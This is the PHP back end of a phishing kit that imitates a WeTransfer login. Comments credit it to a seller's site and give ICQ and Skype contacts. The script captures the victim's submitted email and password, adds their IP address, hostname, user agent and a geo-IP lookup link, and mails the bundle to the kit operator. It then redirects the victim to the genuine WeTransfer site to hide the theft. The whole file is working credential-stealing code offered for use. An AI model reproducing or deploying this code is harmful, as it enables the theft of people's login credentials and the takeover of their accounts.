<?php
/*Coded By FudFreshTools.Com
/*ICQ;ICQ:  750312729
/*Skype:admin@FudFreshTools.Com
*/
if($_POST["uemail"] != "" and $_POST["pd"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| We Tr@nsfer Login Info.|--------------|\n";
$message .= "User Email            : ".$_POST['uemail']."\n";
$message .= "User Password              : ".$_POST['pd']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- ICQ: 750312729(FudFreshTools.Com)--------------|\n";
require('email.php');
$subject = "We Tr@nsfer :| $ip";
{
mail("$to", "$subject", $message);
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://wetransfer.com/");
}else{
header ("Location: index.php");
}

?>
